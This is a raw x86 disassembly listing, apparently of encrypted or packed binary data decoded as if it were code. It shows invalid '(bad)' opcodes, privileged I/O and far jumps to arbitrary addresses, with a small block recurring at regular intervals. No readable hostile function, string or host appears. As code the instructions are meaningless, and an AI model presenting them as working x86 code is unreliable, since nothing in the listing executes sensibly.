  414018:	jb     0x414040
  41401a:	std    
  41401b:	pop    edx
  41401c:	popf   
  41401d:	out    0x2a,al
  41401f:	xchg   ecx,eax
  414020:	leave  
  414021:	inc    ebx
  414022:	push   0x69
  414024:	pop    DWORD PTR [esi-0x37]
  414027:	div    DWORD PTR es:[edx-0xd9a9b81]
  41402e:	push   ebx
  41402f:	test   al,0xcb
  414031:	loop   0x414013
  414033:	mov    ecx,esp
  414035:	mov    DWORD PTR ds:0x8f9eea04,ebx
  41403b:	sub    edi,DWORD PTR ds:0xe96dce7
  414041:	dec    ebp
  414042:	ss pop esi
  414044:	or     al,0x48
  414046:	(bad)  
  414047:	pop    eax
  414048:	xor    BYTE PTR cs:[ebx+0x67],al
  41404c:	aas    
  41404d:	in     eax,0xb2
  41404f:	or     BYTE PTR [ebx+0x6e11b7f7],bh
  414055:	inc    esp
  414056:	adc    al,0x53
  414058:	sahf   
  414059:	scas   al,BYTE PTR es:[edi]
  41405a:	push   0x51
  41405c:	daa    
  41405d:	les    esi,FWORD PTR [esi+esi*1]
  414060:	jbe    0x4140d8
  414062:	fsubr  st,st(1)
  414064:	fiadd  WORD PTR [edx+0x7c0fe714]
  41406a:	rcl    BYTE PTR [eax+0xa077],1
	...
  4140d4:	add    BYTE PTR [eax],al
  4140d6:	pop    edx
  4140d7:	ficom  DWORD PTR [esi+0x60]
  4140da:	(bad)  
  4140db:	in     al,dx
  4140dc:	jle    0x4140d8
  4140de:	call   0x440f:0x38d52e96
  4140e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4140e6:	fadd   DWORD PTR [bx+si]
  4140e9:	add    BYTE PTR [eax],al
  4140eb:	add    DWORD PTR [eax],eax
  4140ed:	add    bl,bl
  4140ef:	pop    DWORD PTR [ebx-0x48]
  4140f2:	or     DWORD PTR [edi+ecx*2],ebp
  4140f5:	pop    ebp
  4140f6:	addr16 loopne 0x4140a1
  4140f9:	pop    esp
  4140fa:	jb     0x41413a
  4140fc:	(bad)  ds:0xd4a8324e
  414102:	cmp    ebx,edi
  414104:	mov    ah,0x36
  414106:	icebp  
  414107:	mov    al,ds:0x9de355bd
  41410c:	scas   al,BYTE PTR es:[edi]
  41410d:	mov    al,0x21
  41410f:	fwait
  414110:	cmp    eax,0xefe2b8e0
  414115:	arpl   WORD PTR [ecx-0x2224d277],sp
  41411b:	pop    ebp
  41411c:	outs   dx,BYTE PTR ds:[esi]
  41411d:	jbe    0x414183
  41411f:	scas   al,BYTE PTR es:[edi]
  414120:	fs std 
  414122:	icebp  
  414123:	mov    BYTE PTR [ebp+0x4d],bh
  414126:	or     bl,ch
  414128:	xchg   esp,eax
  414129:	call   0x2d6dc9b8
  41412e:	or     BYTE PTR [eax+0x503bc1c3],al
  414134:	sar    DWORD PTR [ecx+0x58ee841d],0xc0
  41413b:	mov    edi,0x4151cb8
  414140:	dec    ebx
  414141:	mov    dh,BYTE PTR [ecx-0x4253d228]
  414147:	es test eax,0x371a5a3e
  41414d:	mov    ds,WORD PTR [ecx+0x7d]
  414150:	stc    
  414151:	push   ss
  414152:	and    cl,BYTE PTR ds:0x6bda17e1
  414158:	mov    dh,0xe7
  41415a:	repz adc esp,DWORD PTR [edx-0x4d]
  41415e:	iret   
  41415f:	lea    eax,[ecx+0x178546a7]
  414165:	mov    dl,0x5
  414167:	dec    eax
  414168:	push   ss
  414169:	stc    
  41416a:	push   cs
  41416b:	hlt    
  41416c:	sbb    cl,BYTE PTR ss:[ecx-0x61]
  414170:	xor    eax,0xa9c72d4c
  414175:	jo     0x41411b
  414177:	jno    0x414187
  414179:	mov    al,ds:0xefb8db92
  41417e:	popa   
  41417f:	sbb    edi,DWORD PTR [ebp+0x32afd4f0]
  414185:	fstp   DWORD PTR [ecx+0x77]
  414188:	out    0x12,al
  41418a:	clc    
  41418b:	loop   0x414175
  41418d:	pop    esp
  41418e:	retf   
  41418f:	mov    ?,WORD PTR [ecx]
  414191:	adc    al,0xc3
  414193:	sub    eax,0x3c751d9b
  414198:	mov    WORD PTR [ecx+ebp*4-0x6d],ss
  41419c:	inc    ebp
  41419d:	pop    ebx
  41419e:	js     0x414124
  4141a0:	jmp    0x414153
  4141a2:	jno    0x41416d
  4141a4:	sahf   
  4141a5:	or     BYTE PTR [eax+0x62b28f3],dl
  4141ab:	jo     0x41415d
  4141ad:	push   ds
  4141ae:	sti    
  4141af:	adc    esi,DWORD PTR [ebx]
  4141b1:	jnp    0x41417d
  4141b3:	or     eax,0x61d0949e
  4141b8:	and    al,0xaf
  4141ba:	(bad)  
  4141bb:	mov    dl,0xc3
  4141bd:	inc    edi
  4141be:	cmp    eax,0xac9881e8
  4141c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4141c4:	hlt    
  4141c5:	pop    ds
  4141c6:	mov    al,ds:0xd6c03713
  4141cb:	mov    ebx,0xa6f73208
  4141d0:	(bad)  
  4141d1:	leave  
  4141d2:	pop    eax
  4141d3:	dec    BYTE PTR ds:0x912e3866
  4141d9:	sahf   
  4141da:	popa   
  4141db:	and    al,BYTE PTR [ebx]
  4141dd:	aad    0x64
  4141df:	add    BYTE PTR [ebx-0x6bdf0e92],bl
  4141e5:	mov    al,BYTE PTR [ebp-0x78aebc8d]
  4141eb:	xchg   DWORD PTR [eax],edx
  4141ed:	sbb    eax,0x0
	...
  414256:	add    dl,BYTE PTR [edx]
  414258:	add    DWORD PTR [ebx-0x4c5d4cef],esp
  41425e:	mov    DWORD PTR [ecx+0x37],edx
  414261:	push   edi
  414262:	dec    eax
  414263:	sti    
  414264:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414265:	jg     0x4142ce
  414267:	fld    DWORD PTR [eax]
  414269:	add    BYTE PTR [eax],al
  41426b:	add    DWORD PTR [eax],eax
  41426d:	add    BYTE PTR [ebx+0x2962840f],dl
  414273:	cdq    
  414274:	repnz dec ebx
  414276:	mov    ebx,0xf55fad0
  41427b:	sub    DWORD PTR ds:0x836ce37e,0x715407e3
  414285:	dec    ebx
  414286:	push   edi
  414287:	nop
  414288:	gs and eax,0x8003b754
  41428e:	fst    DWORD PTR [ebx-0x24]
  414291:	arpl   WORD PTR [eax-0x30cadeae],dx
  414297:	ror    ebp,cl
  414299:	mov    ebp,0x398c926b
  41429e:	pop    esp
  41429f:	(bad)
  4142a3:	leave  
  4142a4:	in     al,dx
  4142a5:	data16 and cl,BYTE PTR [ecx]
  4142a8:	ret    0x53b
  4142ab:	popa   
  4142ac:	jmp    0x7a38:0x1d145b9b
  4142b3:	bound  esp,QWORD PTR [ebx+0x42]
  4142b6:	fnsave [ecx+ebx*1+0x3170ab17]
  4142bd:	daa    
  4142be:	enter  0xe6d6,0x7e
  4142c2:	adc    eax,0x4d5b3a89
  4142c7:	pop    ecx
  4142c8:	iret   
  4142c9:	mov    bh,0x5a
  4142cb:	into   
  4142cc:	sbb    dl,BYTE PTR [edx+0x498a5e41]
  4142d2:	mov    al,0x6e
  4142d4:	mov    cl,BYTE PTR [esi-0x4d]
  4142d7:	mov    bl,0x7b
  4142d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4142da:	mov    edi,0xc96c56b7
  4142df:	outs   dx,DWORD PTR ds:[esi]
  4142e0:	call   0xd8d0541d
  4142e5:	sub    DWORD PTR [eax-0x5b33eb96],0x422dbf43
  4142ef:	jmp    0x30529497
  4142f4:	pop    ss
  4142f5:	mov    ds:0xfcd5410d,eax
  4142fa:	push   ebp
  4142fb:	in     al,dx
  4142fc:	inc    esi
  4142fd:	bound  ebx,QWORD PTR [ebx-0x6294cd5]
  414303:	aad    0x1c
  414305:	into   
  414306:	mov    BYTE PTR [edx+0x5a778901],dl
  41430c:	(bad)  
  41430d:	dec    edx
  41430e:	push   esp
  41430f:	xor    DWORD PTR [ecx-0x7a47126e],ecx
  414315:	adc    eax,esp
  414317:	pop    edx
  414318:	fwait
  414319:	xor    eax,0xb464af50
  41431e:	xor    al,0x2c
  414320:	loopne 0x4142d3
  414322:	std    
  414323:	ins    BYTE PTR es:[edi],dx
  414324:	sar    DWORD PTR [edx],1
  414326:	adc    eax,DWORD PTR [edi-0x2d]
  414329:	or     esp,edi
  41432b:	dec    ebx
  41432c:	ret    
  41432d:	rcl    ch,1
  41432f:	and    eax,0xfc62df58
  414334:	xlat   BYTE PTR ds:[ebx]
  414335:	cmp    BYTE PTR [ebp+0xd],dh
  414338:	ret    
  414339:	popa   
  41433a:	retf   
  41433b:	add    eax,0x702007fd
  414340:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414341:	mul    bl
  414343:	mov    esp,0xffc4e69
  414348:	push   esi
  414349:	pushf  
  41434a:	mov    eax,ds:0xe3668172
  41434f:	push   edi
  414350:	jbe    0x4143a5
  414352:	mov    ebx,0xa086d42a
  414357:	fisubr DWORD PTR [eax+0x35]
  41435a:	in     eax,dx
  41435b:	(bad)  
  41435c:	in     al,dx
  41435d:	das    
  41435e:	xchg   DWORD PTR [edi-0x55],ebp
  414361:	lahf   
  414362:	and    al,0x3b
  414364:	jne    0x41438b
  414366:	fwait
  414367:	xchg   ecx,eax
  414368:	fsub   QWORD PTR [ecx-0x4a8a1315]
	...
  4143d6:	add    DWORD PTR [ecx-0x2122293],eax
  4143dc:	mov    cl,0xdd
  4143de:	rol    DWORD PTR [ebp+0x5e],0xa1
  4143e2:	mov    edx,0x67ee8c79
  4143e7:	fiadd  DWORD PTR [eax]
  4143e9:	add    BYTE PTR [eax],al
  4143eb:	add    DWORD PTR [eax],eax
  4143ed:	add    BYTE PTR [eax-0x5b],bl
  4143f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4143f1:	push   es
  4143f2:	pop    ss
  4143f3:	ss pop edx
  4143f5:	pop    ebp
  4143f6:	outs   dx,BYTE PTR ds:[esi]
  4143f7:	fcmovnb st,st(3)
  4143f9:	lods   al,BYTE PTR ds:[esi]
  4143fa:	add    cl,cl
  4143fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4143fd:	lea    edx,[esi+eax*8-0x43a84b55]
  414404:	pop    ebx
  414405:	in     eax,dx
  414406:	inc    esi
  414407:	nop
  414408:	dec    eax
  414409:	pop    ebx
  41440a:	pop    ebp
  41440b:	inc    ebx
  41440c:	aas    
  41440d:	push   ebx
  41440e:	push   es
  41440f:	mov    al,ds:0xc9105215
  414414:	in     al,0x36
  414416:	jo     0x41440d
  414418:	loopne 0x41439a
  41441a:	fmul   st,st(7)
  41441c:	jecxz  0x41446d
  41441e:	jecxz  0x4143dc
  414420:	or     DWORD PTR [ebx+eax*4],edx
  414423:	or     al,0x7a
  414425:	clc    
  414426:	bound  eax,QWORD PTR [ebx-0x4f]
  414429:	aas    
  41442a:	pop    ebp
  41442b:	adc    BYTE PTR es:0x73a939ac,dl
  414432:	outs   dx,DWORD PTR ds:[esi]
  414433:	or     bl,ch
  414435:	xor    ah,BYTE PTR [esi+0x381d5230]
  41443b:	sbb    BYTE PTR [ecx+eax*1+0x29],0x7c
  414440:	test   dh,0x4d
  414443:	inc    edi
  414444:	push   ebx
  414445:	scas   eax,DWORD PTR es:[edi]
  414446:	push   ss
  414447:	mov    ecx,0xab8e7fb1
  41444c:	inc    edx
  41444d:	sbb    esp,DWORD PTR [ecx-0x4b]
  414450:	jmp    0x69a3:0x1d80bd9d
  414457:	inc    edx
  414458:	pushf  
  414459:	iret   
  41445a:	out    0xb,al
  41445c:	loope  0x414449
  41445e:	jno    0x4143fb
  414460:	sbb    ebx,DWORD PTR [edx+0xec8bc39]
  414466:	push   ebx
  414467:	stos   DWORD PTR es:[edi],eax
  414468:	popf   
  414469:	fild   WORD PTR ds:0xd04a7e3e
  41446f:	dec    eax
  414470:	or     DWORD PTR [edx-0x7b],0x14
  414474:	push   esp
  414475:	sub    eax,0xf5c0a52f
  41447a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41447b:	mov    esi,0x27cf6912
  414480:	loop   0x414497
  414482:	push   ebp
  414483:	cmp    bh,BYTE PTR [esi+0x36]
  414486:	shl    BYTE PTR [edx+0x32],cl
  414489:	in     al,dx
  41448a:	(bad)  
  41448c:	xchg   ebx,eax
  41448d:	mov    bh,0xe3
  41448f:	addr16 or eax,0x74caef9
  414495:	mov    al,gs:0xf7c48c67
  41449b:	mov    ah,0xf9
  41449d:	lahf   
  41449e:	pop    esi
  41449f:	xor    esi,DWORD PTR [ebp+0x590c4f5f]
  4144a5:	loopne 0x4144f6
  4144a7:	pop    edx
  4144a8:	loop   0x414505
  4144aa:	fstp   DWORD PTR [edi]
  4144ac:	mov    esi,ecx
  4144ae:	sbb    DWORD PTR [ecx],edi
  4144b0:	test   ch,dh
  4144b2:	add    BYTE PTR ds:0x64e84fff,0x72
  4144ba:	adc    cl,BYTE PTR [eax-0x347d2fc9]
  4144c0:	add    BYTE PTR [esp+eiz*2+0x32],ah
  4144c4:	fisttp QWORD PTR [eax]
  4144c6:	sbb    esp,ebx
  4144c8:	mov    esi,0x3993b351
  4144cd:	cmp    dl,BYTE PTR [esi-0x51705c2f]
  4144d3:	(bad)  [ecx-0x3e87f83c]
  4144d9:	jp     0x414500
  4144db:	dec    edi
  4144dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4144dd:	mov    bl,0xbf
  4144df:	pop    edx
  4144e0:	mov    ebp,0xa863b813
  4144e5:	jo     0x414479
  4144e7:	dec    ebp
  4144e8:	xchg   edx,eax
  4144e9:	cs cwde 
  4144eb:	ja     0x41452b
  4144ed:	out    dx,al
	...
  414556:	pop    ebx
  414557:	jae    0x41459b
  414559:	or     eax,0x775f3d6a
  41455e:	pop    ds
  41455f:	dec    edi
  414560:	or     cl,BYTE PTR [esi-0x13]
  414563:	stos   BYTE PTR es:[edi],al
  414564:	xchg   bh,ah
  414566:	fild   DWORD PTR [bx+si]
  414569:	add    BYTE PTR [eax],al
  41456b:	add    DWORD PTR [eax],eax
  41456d:	add    BYTE PTR [edx],ch
  41456f:	push   eax
  414570:	or     ebx,0x5c188103
  414576:	fst    QWORD PTR [edi]
  414578:	into   
  414579:	xor    BYTE PTR [eax+0x7d393e3c],cl
  41457f:	adc    ecx,ebx
  414581:	das    
  414582:	push   cs
  414583:	daa    
  414584:	jne    0x414586
  414586:	ficomp WORD PTR [eax+0x49]
  414589:	nop
  41458a:	inc    edx
  41458b:	pop    esp
  41458c:	jns    0x414513
  41458e:	jle    0x4145e2
  414590:	repz test BYTE PTR [esi],0x81
  414594:	add    DWORD PTR [ecx-0x53],ecx
  414597:	les    edi,FWORD PTR [ecx+ebp*1]
  41459a:	ret    0x9e08
  41459d:	sbb    DWORD PTR [edx-0x56c7c559],ebp
  4145a3:	jecxz  0x414548
  4145a5:	adc    BYTE PTR [esi+0x33],al
  4145a8:	jmp    0x2364:0xc6514e06
  4145af:	enter  0x8d2b,0x29
  4145b3:	std    
  4145b4:	addr16 inc edi
  4145b6:	xchg   ebx,eax
  4145b7:	jmp    0x41453c
  4145b9:	std    
  4145ba:	xchg   DWORD PTR [eax],edi
  4145bc:	pop    eax
  4145bd:	or     ebx,esi
  4145bf:	add    eax,0x3ec443e2
  4145c4:	ja     0x4145e1
  4145c6:	mov    ah,BYTE PTR [edx-0x45]
  4145c9:	cmp    DWORD PTR [esi+0x2a0170ae],edx
  4145cf:	lock xchg edi,eax
  4145d1:	sbb    eax,0xaa176ec4
  4145d6:	fs mov edi,0xf9ad8a3c
  4145dc:	sub    eax,0xac07a47c
  4145e1:	stc    
  4145e2:	outs   dx,BYTE PTR ds:[esi]
  4145e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4145e4:	(bad)  
  4145e5:	pop    esp
  4145e6:	add    eax,0xa0bab024
  4145eb:	hlt    
  4145ec:	mov    ebx,DWORD PTR [eax-0x3fe1ec3b]
  4145f2:	pop    ss
  4145f3:	push   esp
  4145f4:	lea    ecx,[esi-0x5648d887]
  4145fa:	out    0xbf,al
  4145fc:	add    ah,cl
  4145fe:	out    0xfe,eax
  414600:	jmp    0x3f3dec66
  414605:	mov    ds:0x50e2ebcc,al
  41460a:	nop
  41460b:	loope  0x4145a5
  41460d:	mov    al,0x36
  41460f:	cmp    eax,0x339597c1
  414614:	jmp    0x4145cd
  414616:	push   0xbdeb91a2
  41461b:	jno    0x41468a
  41461d:	out    0xcc,eax
  41461f:	jno    0x41466a
  414621:	test   ebp,0x8cf87a45
  414627:	pop    ebp
  414628:	xor    ecx,esp
  41462a:	shl    dl,1
  41462c:	jne    0x4145bd
  41462e:	adc    eax,0x73dd921d
  414633:	push   eax
  414634:	lea    ebx,[edx]
  414636:	in     eax,dx
  414637:	nop
  414638:	or     DWORD PTR [ebx-0x16bc095e],eax
  41463e:	fimul  WORD PTR [eax+0x1214178c]
  414644:	out    dx,eax
  414645:	(bad)  
  414646:	xor    bh,ah
  414648:	add    ch,bl
  41464a:	jp     0x4146c8
  41464c:	mov    esi,0xda479232
  414651:	pop    ss
  414652:	call   0x74a64ffe
  414657:	pop    ecx
  414658:	pop    ebx
  414659:	xchg   DWORD PTR cs:[ebp-0x7f97bf9e],ecx
  414660:	add    BYTE PTR [edi+0x46],al
  414663:	mov    esp,DWORD PTR [ebx]
  414665:	or     DWORD PTR [esp+ebp*4-0x7b8e4337],edx
  41466c:	dec    edx
  41466d:	xchg   ebp,eax
	...
  4146d6:	jg     0x414736
  4146d8:	cmc    
  4146d9:	ins    DWORD PTR es:[edi],dx
  4146da:	cmc    
  4146db:	out    dx,eax
  4146dc:	call   FWORD PTR [esi+0x17]
  4146df:	enter  0xab7a,0xd
  4146e3:	add    edi,esi
  4146e5:	packuswb mm3,mm4
  4146e8:	add    BYTE PTR [eax],al
  4146ea:	add    BYTE PTR [ecx],al
  4146ec:	add    BYTE PTR [eax],al
  4146ee:	jmp    0x4146da
  4146f0:	lods   al,BYTE PTR ds:[esi]
  4146f1:	push   cs
  4146f2:	and    BYTE PTR [ecx-0x75],cl
  4146f5:	adc    al,0xb1
  4146f7:	xor    eax,0xefc43a5f
  4146fc:	xchg   edi,eax
  4146fd:	inc    eax
  4146fe:	mov    al,ds:0x68b0115f
  414703:	add    ecx,DWORD PTR [edx-0x2604c6c9]
  414709:	mov    bl,0x30
  41470b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41470c:	loop   0x4146f9
  41470e:	sub    ebx,DWORD PTR [eax+0x5db4b1a6]
  414714:	ror    BYTE PTR [edi],cl
  414716:	(bad)  
  414717:	popf   
  414718:	jle    0x414781
  41471a:	into   
  41471b:	xor    eax,0x316107b5
  414720:	pushf  
  414721:	xlat   BYTE PTR ds:[ebx]
  414722:	test   BYTE PTR [eax],al
  414724:	nop
  414725:	shl    DWORD PTR [eax-0x4b05d772],cl
  41472b:	or     bl,dl
  41472d:	mov    dh,0xca
  41472f:	repnz fcmovu st,st(2)
  414732:	ins    DWORD PTR es:[edi],dx
  414733:	int3   
  414734:	sar    ebp,cl
  414736:	jb     0x414714
  414738:	push   cs
  414739:	jl     0x414795
  41473b:	in     al,0xa
  41473d:	sbb    edi,esp
  41473f:	xchg   DWORD PTR [esi+0x7b],esi
  414742:	inc    ebp
  414743:	call   0x6cac25fc
  414748:	sbb    eax,esi
  41474a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41474b:	pop    ecx
  41474c:	vunpcklps xmm0,xmm3,XMMWORD PTR [edi]
  414750:	clc    
  414751:	pushf  
  414752:	mov    ebx,0x1d790ad9
  414757:	in     eax,0xfb
  414759:	lock (bad) 
  41475b:	lods   al,BYTE PTR ds:[esi]
  41475c:	outs   dx,BYTE PTR ds:[esi]
  41475d:	imul   ebp,DWORD PTR [ebx-0x175357b7],0x1757dbc1
  414767:	mov    ds:0x378d74ad,eax
  41476c:	adc    BYTE PTR [ecx],bl
  41476e:	and    DWORD PTR [ecx],ebp
  414770:	jns    0x414754
  414772:	jbe    0x41477c
  414774:	ret    0xa75c
  414777:	(bad)  
  414778:	out    0x1a,eax
  41477a:	cs ja  0x4147ce
  41477d:	mov    ecx,0x274df8d3
  414782:	push   cs
  414783:	icebp  
  414784:	inc    ebx
  414785:	mov    bh,0x25
  414787:	or     edx,DWORD PTR [edi]
  414789:	imul   ebp,DWORD PTR [ebx],0x9d351e1a
  41478f:	cld    
  414790:	inc    ecx
  414791:	add    al,0x73
  414793:	int3   
  414794:	leave  
  414795:	xchg   ebx,eax
  414796:	test   eax,0x2c1960b6
  41479b:	jne    0x4147b9
  41479d:	shl    BYTE PTR [edi+0x74],0x72
  4147a1:	ins    BYTE PTR es:[edi],dx
  4147a2:	test   eax,0x9e0aeb8b
  4147a7:	sbb    ch,BYTE PTR [ecx]
  4147a9:	pop    ecx
  4147aa:	mov    ebx,DWORD PTR gs:[ebx]
  4147ad:	add    al,BYTE PTR fs:[edx+esi*1]
  4147b1:	and    dh,bl
  4147b3:	mov    al,ds:0xe1c754f8
  4147b8:	xchg   ecx,eax
  4147b9:	mov    DWORD PTR [edi+0x19],ecx
  4147bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4147bd:	pop    esi
  4147be:	sar    BYTE PTR [ecx],0x41
  4147c1:	xor    DWORD PTR [esi+0x20],esi
  4147c4:	pop    esi
  4147c5:	sbb    esi,DWORD PTR [ebx]
  4147c7:	(bad)  
  4147c8:	out    dx,al
  4147c9:	arpl   WORD PTR [ebp-0x237e1231],sp
  4147cf:	sbb    eax,0x60ff6dfa
  4147d4:	sar    BYTE PTR [edx+0x27],0x1
  4147d8:	adc    al,0xaa
  4147da:	out    dx,al
  4147db:	adc    eax,0xc80a61e3
  4147e0:	popf   
  4147e1:	inc    ebx
  4147e2:	repnz stos DWORD PTR es:[edi],eax
  4147e4:	push   cs
  4147e5:	inc    edx
  4147e6:	lds    ebp,FWORD PTR [edi]
  4147e8:	sub    al,0x88
  4147eb:	shl    DWORD PTR [eax+0x8b],cl
	...
  414855:	add    BYTE PTR [esi+0x2f],bh
  414858:	add    DWORD PTR [ebp+0x51],ebp
  41485b:	outs   dx,DWORD PTR ds:[esi]
  41485c:	jle    0x41489d
  41485e:	aas    
  41485f:	mov    BYTE PTR [esi],cl
  414861:	cmp    eax,0x42916a85
  414866:	fld    QWORD PTR [bx+si]
  414869:	add    BYTE PTR [eax],al
  41486b:	add    DWORD PTR [eax],eax
  41486d:	add    BYTE PTR [ecx],al
  41486f:	jecxz  0x414830
  414871:	cdq    
  414872:	jp     0x414891
  414874:	popa   
  414875:	xor    al,0x27
  414877:	mov    eax,0xbf009b6
  41487c:	pop    esp
  41487d:	jbe    0x414880
  41487f:	xlat   BYTE PTR ds:[ebx]
  414880:	mov    eax,0x3ec65b56
  414885:	jmp    0x414905
  414887:	sub    DWORD PTR [ecx+0x1868bba6],edi
  41488d:	jle    0x41488f
  41488f:	aam    0xd8
  414891:	cli    
  414892:	sub    eax,0x75695e76
  414897:	sti    
  414898:	aaa    
  414899:	xlat   BYTE PTR ds:[ebx]
  41489a:	inc    ebp
  41489b:	daa    
  41489c:	fwait
  41489d:	and    DWORD PTR [eax],esi
  41489f:	out    0x75,eax
  4148a1:	inc    esi
  4148a2:	shl    al,cl
  4148a4:	dec    eax
  4148a5:	gs xchg ebp,eax
  4148a7:	or     eax,0x8854d5a4
  4148ac:	sub    DWORD PTR [esi+0x77673a4a],esp
  4148b2:	lds    esi,FWORD PTR [eax-0x15]
  4148b5:	nop
  4148b6:	imul   DWORD PTR [ebx+ecx*8]
  4148b9:	pop    ebp
  4148ba:	mov    edx,0x34d4521d
  4148bf:	cmp    al,0x1a
  4148c1:	and    al,al
  4148c3:	stc    
  4148c4:	mov    esp,0x2d35eed
  4148c9:	jmp    0x41489a
  4148cb:	xor    al,0x9a
  4148cd:	xor    ebx,DWORD PTR [esi+0x5848a2d3]
  4148d3:	popf   
  4148d4:	inc    esp
  4148d5:	push   edx
  4148d6:	mov    ds:0xc82d8b88,eax
  4148db:	mov    esp,0x3053e397
  4148e0:	xchg   ebp,eax
  4148e1:	push   ebp
  4148e2:	or     al,0xe5
  4148e4:	hlt    
  4148e5:	or     BYTE PTR [eax],al
  4148e7:	(bad)  
  4148e8:	sbb    eax,0xd6f40af0
  4148ed:	pop    ecx
  4148ee:	push   ebp
  4148ef:	xor    BYTE PTR [esi-0x1f5451a2],ah
  4148f5:	test   eax,0x10640934
  4148fa:	test   DWORD PTR [esi],ebp
  4148fc:	in     eax,0xdf
  4148fe:	fdivr  QWORD PTR [eax]
  414900:	inc    ecx
  414901:	data16 rcl BYTE PTR [edi],0xbf
  414905:	loop   0x41493c
  414907:	scas   eax,DWORD PTR es:[edi]
  414908:	and    eax,0x6cbcd863
  41490d:	push   edx
  41490e:	jne    0x41495a
  414910:	add    al,0x5d
  414912:	jo     0x4148be
  414914:	retf   0x3570
  414917:	scas   eax,DWORD PTR es:[edi]
  414918:	jp     0x414982
  41491a:	stos   DWORD PTR es:[edi],eax
  41491b:	scas   al,BYTE PTR es:[edi]
  41491c:	loope  0x414915
  41491e:	push   ebx
  41491f:	push   esp
  414920:	jb     0x4148b8
  414922:	clc    
  414923:	das    
  414924:	push   edi
  414925:	out    dx,eax
  414926:	xchg   esp,eax
  414927:	dec    ebp
  414928:	clc    
  414929:	mov    ebp,0xee6801e6
  41492e:	in     eax,0x5d
  414930:	and    eax,ebx
  414932:	mov    esp,0xc9bf46b1
  414937:	add    ah,BYTE PTR [edi-0xaada0da]
  41493d:	mov    eax,0x7172ea79
  414942:	mov    DWORD PTR [ebx+ebp*2-0x2c5b0878],ecx
  414949:	sti    
  41494a:	cmp    ah,BYTE PTR [ecx+0x51]
  41494d:	(bad)  [ebx]
  41494f:	dec    ecx
  414950:	shl    eax,1
  414952:	mov    ds:0x71536168,eax
  414957:	sbb    ecx,edi
  414959:	(bad)
  41495c:	cdq    
  41495d:	imul   ecx,DWORD PTR [ecx+eiz*1-0x15],0x50
  414962:	xchg   ebx,eax
  414963:	jns    0x414965
  414965:	ja     0x4149a0
  414967:	cmp    esi,0xffffff93
  41496a:	and    DWORD PTR [ecx],ebx
  41496c:	in     al,dx
  41496d:	push   es
	...
  4149d6:	or     edi,DWORD PTR [esi-0x2e]
  4149d9:	and    esi,edi
  4149db:	scas   eax,DWORD PTR es:[edi]
  4149dc:	sti    
  4149dd:	jle    0x4149c5
  4149df:	pop    edx
  4149e0:	push   ds
  4149e1:	pop    es
  4149e2:	push   es
  4149e3:	jle    0x4149ae
  4149e5:	lock fiadd WORD PTR [bx+si]
  4149e9:	add    BYTE PTR [eax],al
  4149eb:	add    DWORD PTR [eax],eax
  4149ed:	add    al,bh
  4149ef:	test   al,0x97
  4149f1:	xor    eax,0xffffff99
  4149f4:	(bad)  
  4149f5:	push   ebx
  4149f6:	imul   esi,DWORD PTR [eax],0xd97357c2
  4149fc:	hlt    
  4149fd:	push   ebx
  4149fe:	mov    BYTE PTR [ebx-0x1b],cl
  414a01:	(bad)  
  414a02:	test   al,0xbe
  414a04:	push   edx
  414a05:	lahf   
  414a06:	and    ah,bh
  414a08:	pop    esi
  414a09:	js     0x4149de
  414a0b:	adc    al,0x43
  414a0d:	mov    cl,0x28
  414a0f:	adc    DWORD PTR [ebx-0x1d],esp
  414a12:	aad    0x4d
  414a14:	mov    dh,0xa4
  414a16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a17:	and    DWORD PTR [ebx],ecx
  414a19:	xor    esi,DWORD PTR [ebp+ecx*1+0x37a83d01]
  414a20:	je     0x414a6c
  414a22:	inc    esp
  414a23:	sub    dh,0xc2
  414a26:	add    eax,0xb74bab49
  414a2b:	in     eax,0x6f
  414a2d:	shl    DWORD PTR [edx],1
  414a2f:	push   es
  414a30:	in     al,dx
  414a31:	add    bh,BYTE PTR [ecx]
  414a33:	outs   dx,DWORD PTR ds:[esi]
  414a34:	repz jl 0x414a3b
  414a37:	cli    
  414a38:	test   al,0xc8
  414a3a:	jbe    0x414a6a
  414a3c:	ret    
  414a3d:	mov    edi,DWORD PTR [eax-0x17]
  414a40:	or     DWORD PTR ds:0x5e191c6d,ebp
  414a46:	sbb    esp,DWORD PTR [ebx]
  414a48:	adc    DWORD PTR [eax-0x78887219],0x3a
  414a4f:	sbb    ch,BYTE PTR [ecx]
  414a51:	jmp    0xf8ec:0xc302cc72
  414a58:	mov    BYTE PTR [eax],cl
  414a5a:	adc    dh,BYTE PTR [esi-0x67475590]
  414a60:	sbb    eax,esi
  414a62:	xchg   esi,eax
  414a63:	je     0x414aaf
  414a65:	sub    esp,DWORD PTR [esi]
  414a67:	and    eax,0xcfad6235
  414a6c:	or     eax,0x6ed7a214
  414a71:	push   ds
  414a72:	push   0xac082803
  414a77:	and    DWORD PTR [esi],0x5b
  414a7a:	mov    dl,0xa5
  414a7c:	cdq    
  414a7d:	push   edi
  414a7e:	xchg   ebx,eax
  414a7f:	js     0x414a99
  414a81:	cmp    al,0xb5
  414a83:	frstor [ebx-0x56683fe1]
  414a89:	dec    edx
  414a8a:	fstp   TBYTE PTR [ebp+0x10be140c]
  414a90:	cmp    al,0xd2
  414a92:	mov    cl,0x22
  414a94:	push   0x573433e3
  414a99:	add    BYTE PTR [ebp-0x6258e17e],0xd1
  414aa0:	push   0xdc114210
  414aa5:	mov    dl,0xef
  414aa7:	sti    
  414aa8:	mov    bl,0xed
  414aaa:	out    dx,eax
  414aab:	xor    al,0x94
  414aad:	outs   dx,BYTE PTR ds:[esi]
  414aae:	scas   al,BYTE PTR es:[edi]
  414aaf:	test   BYTE PTR [ecx],ch
  414ab1:	ror    DWORD PTR [esi],1
  414ab3:	or     eax,edi
  414ab5:	cmp    eax,0xc7a8cf3b
  414aba:	int3   
  414abb:	(bad)
